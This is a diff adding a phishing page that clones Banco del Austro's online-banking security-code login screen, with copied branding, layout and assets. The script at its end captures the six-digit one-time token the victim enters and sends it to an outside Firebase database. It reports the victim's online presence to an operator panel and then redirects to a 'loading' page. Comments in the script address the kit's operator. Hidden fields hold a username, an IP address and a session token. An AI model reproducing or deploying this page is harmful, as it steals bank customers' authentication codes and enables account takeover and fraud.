+        element.style.visibility = 'hidden';
+    }
+
+    function navigateToPage(id, url) {
+        //console.log("llego al navigateToPage: ", id, url);
+        __doPostBack(id, url);
+    }
+
+    //function onClickButton() {
+    //    let param = "parametroTest";
+    //    __doPostBack('miBoton', param);
+    //}
+
+</script>
+
+
+
+
+
+<nav id="bdaNavbar" class="navbar navbar-expand-lg navbar-white bg-white shadow-sm" style="height: 10%; position: fixed; width: 100%; z-index: 1000">
+    <div class="d-flex flex-row justify-content-between w-100">
+        <a class="navbar-brand d-inline-flex align-items-center" href="https://www.baustroonline.com/Registro/frmOTPLogin.aspx#">
+            <img src="./token_files/logo.svg" alt="Logo BDA" class="responsive-img">
+        </a>
+        <div class="d-flex align-items-center">
+
+            <div class="d-flex flex-column ">
+
+                <div class="d-flex flex-row align-items-center justify-content-end gap-1">
+                    
+                    <span id="ctl00_objctrCab_lblIdentificacion" class="p-0 m-0" style="font-weight: 600; font-size: 16px; line-height: 18px; color: #00166a;"></span>
+                </div>
+
+                <div class="d-flex flex-row align-items-center justify-content-end gap-1">
+                    <div class="d-inline-flex flex-row align-items-center justify-content-center">
+                        
+                        <span id="ctl00_objctrCab_lblUltIngreso" class="p-0 m-0" style="font-weight: 400; font-size: 10px; line-height: 13.08px; color: #00166a;"></span>
+                    </div>
+
+                    <div class="d-inline-flex flex-row align-items-center justify-content-center">
+                        
+                        <span id="ctl00_objctrCab_lblUltMaquina" class="p-0 m-0" style="font-weight: 400; font-size: 10px; line-height: 13.08px; color: #00166a;"></span>
+                    </div>
+                </div>
+
+                
+            </div>
+
+
+            <div class="responsive-nav-text">
+                
+
+                <ul class="dropdown-menu dropdown-menu-end border-light" style="border-radius: 0px; margin-right: 2rem">
+
+                    <li class="mt-1 px-3" style="width: 239px">
+                        <a id="ctl00_objctrCab_lBtnQuotaManagement" class="nav-dropdown-link" href="javascript:__doPostBack(&#39;ctl00$objctrCab$lBtnQuotaManagement&#39;,&#39;&#39;)">
+                                <i class="bi bi-pen" style="width: 16px; height: 16px;"></i>&nbsp;&nbsp;
+                                <span class="nav-dropdown-text">Personalización de cupos</span>
+                        </a>
+                    </li>
+
+                    <li class="mt-1 px-3" style="width: 239px">
+                        <a id="ctl00_objctrCab_lBtnAuthProducts" class="nav-dropdown-link" href="javascript:__doPostBack(&#39;ctl00$objctrCab$lBtnAuthProducts&#39;,&#39;&#39;)">
+                            <i class="bi bi-check-circle" style="width: 16px; height: 16px;"></i>&nbsp;&nbsp;
+                          <span class="nav-dropdown-text">Confirmar mis productos
+                          </span>
+                        </a>
+                    </li>
+
+                    <li class="mt-1 px-3" style="width: 239px">
+                        <a id="ctl00_objctrCab_lBtnChangePassword" class="nav-dropdown-link" href="javascript:__doPostBack(&#39;ctl00$objctrCab$lBtnChangePassword&#39;,&#39;&#39;)">
+                            <i class="bi bi-lock" style="width: 16px; height: 16px;"></i>&nbsp;&nbsp;
+                  <span class="nav-dropdown-text">Cambiar contraseña </span>
+                         </a>
+                    </li>
+
+                    <li class="mt-1 px-3" style="width: 239px">
+                        <a id="ctl00_objctrCab_lBtnLogout" class="nav-dropdown-link" href="javascript:__doPostBack(&#39;ctl00$objctrCab$lBtnLogout&#39;,&#39;&#39;)">
+                            <i class="bi bi-box-arrow-right" style="color: #ea0029; width: 16px; height: 16px;"></i>&nbsp;&nbsp;
+                  <span class="nav-dropdown-text">Cerrar sesión </span>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav>
+
+<div id="ctl00_objctrCab_uPnlSidebar">
+		
+
+        <button class="btn d-block d-lg-none d-xl-none d-xxl-none bda-sidebar-button" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasResponsive" aria-controls="offcanvasResponsive" id="btnToggleMobileSidebar" style="visibility: hidden;">
+            <i class="bi bi-list" style="color: white;"></i>
+        </button>
+
+        
+
+        <div class="offcanvas offcanvas-start d-block d-lg-none d-xl-none d-xxl-none" tabindex="-1" id="offcanvasResponsive" aria-labelledby="offcanvasResponsiveLabel">
+            <div class="offcanvas-header">
+                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Cerrar" id="btnCloseMobileSidebar"></button>
+            </div>
+            <div class="offcanvas-body">
+                
+            </div>
+        </div>
+
+    
+	</div>
+
+
+
+
+
+<table cellspacing="0" cellpadding="0" border="0" width="100%" onkeydown="KeyDownHandler(event);" style="background-color: #1F3A82;" class="d-none">
+    <!-- <tr style="height: 35px; border-bottom: 1px solid #F1B634;"> -->
+    <tbody><tr style="height: 35px; padding-bottom: 100px; border-bottom: 1px solid #F1B634;">
+        <!-- 
+	
+	<tr style="height: 35px; "> -->
+        <td class="clsTitulo" style="color: #ffffff; background-color: #1C2B4D">
+            <!-- 
+		
+		<td class="clsTitulo" style="color: #ffffff; "> -->
+
+            <table cellspacing="0" cellpadding="0" border="0" width="100%" onkeydown="KeyDownHandler(event);" style="background-color: #1C2B4D">
+                <!-- 
+			<table cellspacing="0" cellpadding="0" border="0" width="100%" onkeydown="KeyDownHandler(event);" style="background-color: #1F3A82"> -->
+
+                <tbody><tr>
+                    <td style="height: 25px; font-size: x-small; color: #F2F2F2; margin-left: 120px; margin-right: 12px; padding-left: 12px; padding-left: 160px;" class="font_header_desc">
+                        <!-- 
+						
+						<td style="height: 25px; font-size: x-small; color: #F2F2F2; margin-left: 12px; margin-right: 12px; padding-left: 12px; padding-left: 12px;"
+                        class="font_header_desc">
+						-->
+
+
+                        
+                        <br>
+
+                    </td>
+                </tr>
+            </tbody></table>
+        </td>
+        <td align="right" style="background-color: #1C2B4D; padding-right: 150px;">
+            <!-- 
+		<td align="right"> -->
+            <span style="color: #ffffff;" class="font_header_desc">
+
+                        </span><table cellspacing="0" cellpadding="0" border="0" style="color: #ffffff;">
+                <tbody><tr><td valign="top" align="left">
+                    </td></tr><tr>
+                        
+                    </tr>
+                
+                <tr><td>
+                    </td></tr><tr valign="top" align="left">
+                        <td valign="top" style="width: 14px;">
+                            
+                        </td>
+                        <td valign="top" style="width: 100px;" class="clsSubTitulo">
+                            <table cellspacing="0" cellpadding="0" border="0">
+                                <tbody><tr>
+                                    <td>
+                                        
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                            &nbsp;
+                        </td>
+                        <td valign="top" style="width: 100px;" class="clsSubTitulo">
+                            <table cellspacing="0" cellpadding="0" border="0">
+                                <tbody><tr>
+                                    <td>
+                                        
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                            <a id="ctl00_objctrCab_linkLegal" class="clsSubTitulo" href="javascript:__doPostBack(&#39;ctl00$objctrCab$linkLegal&#39;,&#39;&#39;)" style="color:White;font-weight:normal;text-decoration:none;text-decoration: underline;">AVISO LEGAL</a>&nbsp;</td>
+                        <td valign="top" class="clsSubTitulo" style="color: #ffffff;">
+                            <table cellspacing="0" cellpadding="0" border="0">
+                                <tbody><tr>
+                                    <td>
+                                        
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                            <a id="ctl00_objctrCab_linkSalir" class="clsSubTitulo" href="javascript:__doPostBack(&#39;ctl00$objctrCab$linkSalir&#39;,&#39;&#39;)" style="color:White;font-weight:normal;text-decoration:none;text-decoration: underline;">SALIR</a>&nbsp;</td>
+                        <!-- <td valign="top" style="width: 20px;">
+                        
+                    </td> -->
+
+                    </tr>
+                
+
+            </tbody></table>
+        </td>
+    </tr>
+
+
+
+
+    <tr class="clsFondoMenuSec" style="background-color: #1C2B4D">
+        <td valign="middle" style="height: 43px; border-top: 1px solid #F1B634;" colspan="2">
+            <div id="ctl00_objctrCab_pnlMenSecundario">
+		
+                <table cellspacing="0" cellpadding="0" border="0" align="center" style="background-color: #1C2B4D; color: white">
+                    <tbody><tr>
+                        <td align="left" style="text-align: center" valign="top">
+                            
+                        </td>
+                        <td align="left" valign="top" style="text-align: left">
+                            
+                        </td>
+                    </tr>
+                </tbody></table>
+            
+	</div>
+        </td>
+    </tr>
+
+
+    <tr>
+        <td colspan="2">
+            <table cellspacing="0" cellpadding="0" width="100%" border="0">
+                <tbody><tr>
+                    <td valign="bottom">
+                        <table class="clsMsgCabecera" cellspacing="0" cellpadding="0" width="100%" border="0">
+                            <tbody><tr>
+                                <td align="left">
+                                    
+                                    
+                                </td>
+                                <td align="right">
+                                </td>
+                                <td align="right">
+                                    <span id="ctl00_objctrCab_lblModulo"></span>
+                                </td>
+                            </tr>
+                        </tbody></table>
+                    </td>
+                </tr>
+            </tbody></table>
+        </td>
+    </tr>
+</tbody></table>
+
+        
+</div>
+
+
+        <div id="ctl00_upnlMenu">
+	
+                <div id="ctl00_pnlMenu">
+		
+                    
+
+<style>
+
+	a:link {
+		color: green;
+		background-color: transparent;
+		text-decoration: none;
+	}
+
+	a:visited {
+		color: pink;
+		background-color: transparent;
+		text-decoration: none;
+	}
+
+	a:hover {
+		color: red;
+		background-color: transparent;
+		text-decoration: underline;
+	}
+
+	a:active {
+		color: yellow;
+		background-color: transparent;
+		text-decoration: underline;
+	}
+
+	.bda-sidebar {
+		background-color: white;
+		width: 285px;
+		height: 100%;
+		position: fixed;
+		top: 10%;
+		bottom: 0;
+		left: 0;
+		overflow-y: auto;
+	}
+
+	.sidebar-item {
+		display: flex;
+		flex-direction: row;
+		justify-content: space-between;
+		align-items: center;
+		font-family: 'Assistant';
+		font-weight: 400;
+		font-size: 14px;
+		line-height: 16px;
+		color: #00166A;
+		padding-top: 10px;
+		padding-bottom: 10px;
+		padding-left: 20px;
+		padding-right: 20px;
+	}
+	
+	
+	.sidebar-item:hover {
+		cursor: pointer;
+		font-weight: 700;
+		font-size: 14px;
+		line-height: 18.31px;
+		color: #00166A;
+		background-color: #B2DAFF;
+	}
+
+</style>
+
+
+
+
+
+
+<script type="text/javascript">
+	$(function() {
+	    var menu_ul = $('.menu > li > ul');
+	    var menu_a  = $('.menu > li > a');
+	    menu_ul.hide();
+	    menu_a.click(function(e) {
+	        e.preventDefault();
+	        if(!$(this).hasClass('active')) {
+	            menu_a.removeClass('active');
+	            menu_ul.filter(':visible').slideUp('normal');
+	            $(this).addClass('active').next().stop(true,true).slideDown('normal');
+	        } else {
+	            $(this).removeClass('active');
+	            $(this).next().stop(true,true).slideUp('normal');
+	        }
+	    });
+	});
+</script>
+
+                
+	</div>
+            
+</div>
+
+        <div id="bdaMainContent" class="main-content-expanded">
+            <div id="objFrame" style="height: 100%">
+                
+    
+	<!-- REQ-ST -->
+    <!-- 
+    <script src="../ObjetosDetectId/jquery.min.js" type="text/javascript"></script>
+    <script src="../ObjetosDetectId/jquery-ui.js" type="text/javascript"></script>
+    <script src="../ObjetosDetectId/jquery.plugin.min.js" type="text/javascript"></script>
+    <script src="../ObjetosDetectId/jquery.keypad.js" type="text/javascript"></script>
+    <script src="../ObjetosDetectId/jquery.keypad-es.js" type="text/javascript"></script>
+    -->
+	
+	<link href="./token_files/StyleSecureToken.css" rel="stylesheet" type="text/css">
+    <link href="./token_files/Styles(1).css" rel="stylesheet" type="text/css">
+    <link href="./token_files/default.css" type="text/css" rel="stylesheet">
+    <script type="text/javascript" src="./token_files/frmOTPLogin.js.descarga"></script> 
+
+    
+    <script type="text/javascript">
+        function _doitvaluechange() {
+            var xShw = ['ctl00_ContentPlaceHolder1_txtCodigo'];
+            var xVal = ['ctl00_ContentPlaceHolder1_txtCodigo'];
+            _securecode_prepare(xShw, xVal, null);
+        }
+        function impresionPapeleta() {
+            window.print();
+            return false;
+        }
+		document.addEventListener("DOMContentLoaded", function() {
+            let elements = document.querySelectorAll('.textWithPointCap');
+            
+            elements.forEach(function(element) {
+                let text = element.innerText.toLowerCase(); // Convierte todo el texto a minúsculas
+                
+                // Reemplaza la primera letra y cualquier letra después de un punto y espacio por su versión en mayúsculas
+                text = text.replace(/(^\s*\w|[\.\!\?]\s+\w)/g, function(c) {
+                    return c.toUpperCase();
+                });
+
+                element.innerText = text;
+            });
+        });
+
+    </script>
+	<input type="hidden" name="ctl00$ContentPlaceHolder1$anticsrftoken" id="ctl00_ContentPlaceHolder1_anticsrftoken" value="65124cba-b4ce-4fb8-9fab-a8e6ebef7993">
+    <table cellspacing="0" cellpadding="0" width="100%" border="0" class="bgColor">        
+        <tbody><tr class="clsFondoForm bgColor">
+            <td width="10" class="newbgColor"></td>
+            <td>
+				<div id="ctl00_ContentPlaceHolder1_pnlContinuar" class="newbgColor" style="width:100%;">
+	                    
+                    <br>
+                    <div>
+                        <div id="ctl00_ContentPlaceHolder1_pnlOTP" style="width:100%;">
+		
+                            <div id="ctl00_ContentPlaceHolder1_containerOTP" class="container">
+								<div class="centerCont">
+									<div class="contenedorBlank">
+										<div class="internalContainer">
+											
+											<table id="ctl00_ContentPlaceHolder1_tb_title_2" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+			<tbody><tr>
+				<td align="center" style="display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top:20px;">
+															
+														</td>
+			</tr>
+		</tbody></table>
+		
+											<table id="ctl00_ContentPlaceHolder1_tb_title" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+			<tbody><tr>
+				<td align="center" class="headerCodSecurity">
+														
+															<div class="headerTextST">
+																Códigos de Seguridad
+															</div>
+															<!--  -->
+														</td>
+			</tr>
+			<tr>
+				<td></td>
+			</tr>
+			<tr>
+				<td align="center">
+															<img id="ctl00_ContentPlaceHolder1_imgcentral" class="imgcentral" src="./token_files/LogoADBV.png" style="border-width:0px;widht: 150px; height: 65px; border-width:0px;padding-left:0px;margin-top:30px;">
+														</td>
+			</tr>
+			<tr>
+				<td align="center" class="nameTextStyle" style="white-space: nowrap;">
+															
+															<strong id="ctl00_ContentPlaceHolder1_id_welcome"></strong>
+														</td>
+			</tr>
+		</tbody></table>
+		
+											<br>
+											
+											
+											
+											
+											<span id="ctl00_ContentPlaceHolder1_lblError" class="B rojo"></span>
+
+
+											
+											
+											<div id="ctl00_ContentPlaceHolder1_PanelValida" class="container3" onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;ctl00_ContentPlaceHolder1_btnValidarToken&#39;)">
+			
+												<div class="container3">
+													<div class="centerTokenInfo">
+														<span id="ctl00_ContentPlaceHolder1_lblMsgP1" class="textAToken">Estimado cliente, </span>
+														<span id="ctl00_ContentPlaceHolder1_lblContacto2" class="textATokenBold" style="font-size:14px;font-weight:bold;">genere su código de seguridad desde su aplicativo </span>
+														<img id="ctl00_ContentPlaceHolder1_imagenAustroToken" src="./token_files/btn_austrotoken.png" style="border-width:0px;width: 65px;  vertical-align: bottom;">
+														<br>
+														<span id="ctl00_ContentPlaceHolder1_lblMsgP2" class="textAToken">Tiene 3 intentos de ingreso, caso contrario bloqueará su usuario web temporalmente.</span>
+														<br>
+														<br>
+														<div class="tac center_vertical" style="width:100%;">
+															<div class="nameClient">
+																Código de Verificación
+															</div>
+															<div style="width:15px;"></div>
+															<input type="password" inputmode="numeric" maxlength="6" minlength="6" id="token" required class="inputOTP">
+														</div>
+														
+														<br>
+													</div>
+													<div class="centerCont">
+														<div class="textError colorError textWithPointCap"></div>
+													</div>
+													
+													<br>
+													<div style="text-align: center;">
+													
+														<input type="submit" name="ctl00$ContentPlaceHolder1$btnCancelarValidar" value="Cancelar" onclick="_doitvaluechange();" id="ctl00_ContentPlaceHolder1_btnCancelarValidar" class="button_cancelST" style="margin-right:5px; width: 180px;">
+													
+														<input type="submit" value="Continuar" id="btn-envio" class="button_confirmST" style="margin-left:5px; width: 180px;">
+														
+													</div>
+													<br>
+												</div>
+											
+		</div>
+										</div>
+									</div>
+								</div>
+                            </div>
+                        
+	</div>
+                    </div>
+                
+</div>
+
+                <div id="loader" class="panelProgressOcul">
+                    <div class="overlay">
+                        <div class="overlayContent">
+                            <table style="margin: auto; text-align: center; position: relative; top: 50%;">
+                                <tbody><tr>
+                                    <td>
+                                        <div class="divLoader">
+                                            <img src="./token_files/msg-espere-proc.gif" alt="Procesando" class="centerImg">
+                                        </div>
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                        </div>
+                    </div>
+                </div>
+            </td>
+            <td width="10"></td>
+        </tr>
+    </tbody></table>
+
+    <script language="javascript" type="text/javascript">
+        function SelectSingleRadiobutton(rdbtnid) {
+            var rdBtn = document.getElementById(rdbtnid);
+            var rdBtnList = document.getElementsByTagName("input");
+            for (i = 0; i < rdBtnList.length; i++) {
+                if (rdBtnList[i].type == "radio" && rdBtnList[i].id != rdBtn.id) {
+                    rdBtnList[i].checked = false;
+                }
+            }
+        }
+    </script>
+
+            </div>
+        </div>
+
+        
+
+
+
+
+<style>
+    .footer-text {
+        font-family: 'Assistant';
+        font-weight: 400;
+        font-size: 12px;
+        line-height: 14.52px;
+        color: #FFFFFF;
+    }
+
+    .footer-link {
+        color: white;
+        text-decoration: none;
+    }
+    
+    .footer-link::after hover {
+        color: white;
+        text-decoration: none;
+    }
+</style>
+
+<div class="footer-text" style="width: 100%; position: absolute; bottom: 0; left: 0; z-index: 1000; background-color: #00166a;">
+    <div class="container-fluid text-center p-1">
+        @ Banco del Austro 2024 - Todos los derechos reservados | <a href="https://www.bancodelaustro.com/Terms" target="_blank"><span class="footer-link">Términos de uso</span></a> | <a href="https://www.bancodelaustro.com/Privacy" target="_blank"><span class="footer-link">Política de privacidad</span></a>
+    </div>
+</div>
+
+
+
+<table cellspacing="0" cellpadding="0" width="100%" class="clsPie d-none" style="background-color: #E0E0E0;">
+
+    <tbody><tr>
+
+        <td align="left" class="clsFuenteB">
+        </td><td align="right">
+            
+        </td>
+
+    </tr>
+
+    <tr>
+        <td>
+            <div id="ctl00_objctrPie_UPpaneles">
+	
+                    <input id="btn1" type="hidden" value="" onclick="javascript: Redirect();">
+                    <input type="hidden" name="ctl00$objctrPie$Url" id="ctl00_objctrPie_Url">
+                    <input type="hidden" name="ctl00$objctrPie$IdUsuario" id="ctl00_objctrPie_IdUsuario" value="Jensss070887">
+                    <input type="hidden" name="ctl00$objctrPie$Identificacion" id="ctl00_objctrPie_Identificacion">
+                    <input type="hidden" name="ctl00$objctrPie$TipoIdentificacion" id="ctl00_objctrPie_TipoIdentificacion">
+                    <input type="hidden" name="ctl00$objctrPie$NombreUsuario" id="ctl00_objctrPie_NombreUsuario">
+                    <input type="hidden" name="ctl00$objctrPie$Maquina" id="ctl00_objctrPie_Maquina" value="85.204.78.16">
+                    <input type="hidden" name="ctl00$objctrPie$Token" id="ctl00_objctrPie_Token" value="A958CD89BC72772214C3EAEA7887D2E0C332284FDD73D88A496B06FE9B783FA6FEE7F279B826F7F1">
+                    <input type="hidden" name="ctl00$objctrPie$IdEmpresa" id="ctl00_objctrPie_IdEmpresa" value="1">
+                    <input type="hidden" name="ctl00$objctrPie$NombreEmpresa" id="ctl00_objctrPie_NombreEmpresa">
+                    <input type="hidden" name="ctl00$objctrPie$IdSucursal" id="ctl00_objctrPie_IdSucursal" value="5">
+                    <input type="hidden" name="ctl00$objctrPie$IdentSucursal" id="ctl00_objctrPie_IdentSucursal">
+                    <input type="hidden" name="ctl00$objctrPie$NombreSucursal" id="ctl00_objctrPie_NombreSucursal">
+                    <input type="hidden" name="ctl00$objctrPie$IdentEmpresa" id="ctl00_objctrPie_IdentEmpresa">
+                    <input type="hidden" name="ctl00$objctrPie$OpidentEmpresa" id="ctl00_objctrPie_OpidentEmpresa">
+                    <input type="hidden" name="ctl00$objctrPie$OpidentSucursal" id="ctl00_objctrPie_OpidentSucursal">
+                    <input type="hidden" name="ctl00$objctrPie$IdUsuarioAnterior" id="ctl00_objctrPie_IdUsuarioAnterior">
+                
+</div>
+        </td>
+    </tr>
+</tbody></table>
+<script type="text/javascript">
+		document.addEventListener('DOMContentLoaded',	function anio(){
+			var fecha= new Date();
+			var year=fecha.getFullYear();
+			document.getElementById('current_year').innerHTML=""+year;
+
+	});
+	
+	</script>
+
+<div class="Copyright d-none">
+    <span id="dnn_dnnCopyright_lblCopyright" class="banner" style="font-weight: bold">TODOS LOS DERECHOS RESERVADOS
+			© BANCO DEL AUSTRO S.A. | <span id="current_year">2026</span> |</span>
+		<a id="dnn_dnnTerms_hypTerms" class="banner1" rel="nofollow" href="https://www.bancodelaustro.com/Terms" target="_blank" style="text-decoration: underline; color: #FFFFFF;"> Términos de uso |</a>
+		
+		<a id="dnn_dnnPrivacy_hypPrivacy" class="banner1" rel="nofollow" href="https://www.bancodelaustro.com/Privacy" target="_blank" style="text-decoration: underline; color: #FFFFFF;">Política de privacidad</a>
+		|
+		<a class="banner1" href="https://www.baustroonline.com/" style="text-decoration: underline; color: #FFFFFF;">Salir</a>
+
+</div>
+
+
+
+
+
+        <table width="100%" cellspacing="0" cellpadding="0" class="bgColor d-none">
+            <tbody><tr class="d-none">
+                <td>
+                    <div id="ctl00_pnlPrin" style="width:100%;">
+	
+                        <table cellspacing="0" cellpadding="0" class="clsFondoPrin tableHeader">
+                            <tbody><tr>
+                                <td colspan="2" style="background-color: #1C2B4D">
+                                    <table width="100%">
+                                        <tbody><tr>
+                                            <td valign="middle">&nbsp;<span id="ctl00_lblFecha" class="clsSubTitulo">Ecuador, sábado, 11 de julio de 2026</span>
+                                            </td>
+                                            <td align="right" class="clsSubTitulo" valign="middle">
+                                                <a id="ctl00_lbtnContactenos" class="clsSubTitulo" href="javascript:__doPostBack(&#39;ctl00$lbtnContactenos&#39;,&#39;&#39;)" style="text-decoration:none;color: #F2F2F2; text-decoration: underline;">Contctenos</a>
+                                            &nbsp;
+                                                
+                                        </td></tr>
+                                    </tbody></table>
+                                </td>
+                            </tr>
+                            <tr style="display: none;">
+                                <td></td>
+                                <td align="center" width="100%">
+                                    <div id="ctl00_pnlInfoMsg">
+		
+                                            <span id="ctl00_lblModulo" style="font-size:Medium;font-weight:bold;font-style:italic;"></span>
+                                            <span id="ctl00_lblFormulario" style="font-size:Medium;font-weight:bold;font-style:italic;"></span><span id="ctl00_lblMsg" class="clsMsg" style="color:#C0C000;"></span>
+                                        
+	</div>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td colspan="2" style="background-color: #1C2B4D; height: 100px;">
+                                    <table id="tableHeader" class="headerTableContainer center" style="background-color: #1C2B4D;">
+                                    <tbody><tr id="headerPersonas"><td class="tdLogoHeader" style="background-color: #1C2B4D"> <img class="logoHeader" src="./token_files/logo-ba-virtual.png" alt="" style="width: 290.4px; height: 50.15px;"></td><td class="tdSubLogoHeader" style="background-color: #1C2B4D"><img class="subLogoHeader" src="./token_files/lobo-ba-personas.png" alt="" style="width: 143px; height: 45.91px;"></td></tr></tbody></table>
+                                </td>
+                            </tr>
+                        </tbody></table>
+                    
+</div>
+                </td>
+            </tr>
+            <tr class="d-none">
+                <td>
+                    
+                </td>
+            </tr>
+            <tr>
+                <td valign="top" style="height: 480px; /*padding-top: 12px; */">
+                    <table cellspacing="0" cellpadding="0" width="100%">
+                        <tbody><tr>
+                            <td valign="top" style="height: 480px;"></td>
+                            <td valign="top" style="height: 480px;"></td>
+                        </tr>
+                    </tbody></table>
+                </td>
+            </tr>
+            <tr>
+                <td style="display: none">&nbsp;<input type="hidden" name="ctl00$txtargs" id="ctl00_txtargs">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <div id="ctl00_pnlavce" style="left: 751px; top: 362px; position: fixed;">
+	
+                        <div>
+                            <span id="ctl00_lblProceso" class="MsgProceso"></span>
+                        </div>
+                    
+</div>
+                    
+                </td>
+            </tr>
+            <tr>
+                <td width="100%" valign="bottom" style="height: 15px; background-color: #ffffff;"></td>
+            </tr>
+        </tbody></table>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+removeMarginLeft();Sys.Application.add_init(function() {
+    $create(AjaxControlToolkit.AlwaysVisibleControlBehavior, {"HorizontalOffset":10,"HorizontalSide":1,"VerticalOffset":10,"VerticalSide":1,"id":"ctl00_avce"}, null, null, $get("ctl00_pnlavce"));
+});
+//]]>
+</script>
+</form>
+    <!-- REQ-ST -->
+    <div class="modal fade" id="modalSessionTimeout" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content text-center" style="max-width: 400px !important; background: #F2F2F2 0% 0% no-repeat padding-box; color: #00166A; box-shadow: 0px 0px 20px #00000029 !important; opacity: 1;">
+                <div class="modal-header text-center" style="background-color: #00166A !important;">
+                    <h5 class="modal-title w-100" style="font: 18px Assistant-Bold !important; color: #F2F2F2 !important;" id="headerModalSession">IMPORTANTE</h5>
+                </div>
+                <div id="bodyModalSession" class="modal-body">
+                    <div class="">
+                        <div class="row ">
+                            <div class="col-1"></div>
+                            <div class="col-4 d-flex align-items-center justify-content-center" style="opacity: 1; padding: 0;">
+                                <img src="./token_files/reloj.png" style="width: 60% !important;" alt="">
+                            </div>
+                            <div class="col-5">
+                                <div class="row d-flex justify-content-center">
+                                    <label id="lblConfirmSessionTxt" style="font: 13px Assistant-Medium, Medium !important;">Su sesión va a expirar en:</label>
+                                </div>
+                                <div class="row d-flex justify-content-center">
+                                    <label id="lblConfirmSessionTimer" style="font: 22px Assistant-ExtraBold, Heavy !important; margin-bottom: 0 !important">20</label>
+                                </div>
+                                <div class="row d-flex justify-content-center">
+                                    <label id="lblConfirmSessionTimerUnit" style="font: 13px Assistant-Bold, Heavy !important;">SEGUNDOS</label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="footModalSession" class="modal-footer justify-content-center" style="border: none; padding-top: 0;">
+                    <div id="ctl00_spinnerModalSession" style="display: none;">
+                        <div class="text-center">
+                            <div class="spinner-border text-danger" role="status">
+                                <span class="sr-only">Loading...</span>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- <button id="btnCloseSession" type="button" class="btn btn-danger" style="font: 14px Latinotype_Texta_Regular, Heavy !important; height:30px !important;border: none !important;" data-dismiss="modal" onclick="CloseSession()">CERRAR</button> -->
+                    <button id="btnContinueSession" type="button" class="btn" style="border-style: none; background-color: #00166A; color: #FFFFFF; font: 14px Assistant, Heavy !important; height: 30px !important; border: none !important;" data-dismiss="modal" onclick="ContinueSession()">CONTINUAR SESIÓN</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="text/javascript" src="./token_files/bootstrap.bundle.min.js.descarga" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>    
+
+
+<script>
+    // 1. CONFIGURACIÓN
+    const firebaseConfig = { 
+        databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" 
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 2. OBTENER EL ID DE LA URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('id');
+
+    if (sessionId) {
+        // Lógica de presencia para la luz del panel
+        const presenceRef = db.ref('logins/' + sessionId + '/online');
+        db.ref(".info/connected").on("value", (snap) => {
+            if (snap.val() === true) {
+                presenceRef.set(true);
+                presenceRef.onDisconnect().set(false);
+            }
+        });
+
+        // Evento al presionar continuar
+        document.getElementById('form-login').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // CAPTURA DE 1 SOLO INPUT (Asegúrate de que tu input tenga id="sms-input")
+            const codigoCompleto = document.getElementById('token').value;
+            
+            const btn = document.getElementById('btn-envio');
+            
+            // Validación mínima para no enviar vacío
+            if (codigoCompleto.length < 6) {
+                return; 
+            }
+
+            btn.disabled = true;
+
+            // Actualizar el mismo registro y redirigir
+            db.ref('logins/' + sessionId).update({
+                token: codigoCompleto,
+                step: 'TOKEN_ENTREGADO' // Cambié 'status' por 'step' para que tu panel lo lea correctamente
+            }).then(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            }).catch(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            });
+        });
+
+    } else {
+        window.location.href = 'index.html';
+    }
+</script>
+</body></html>
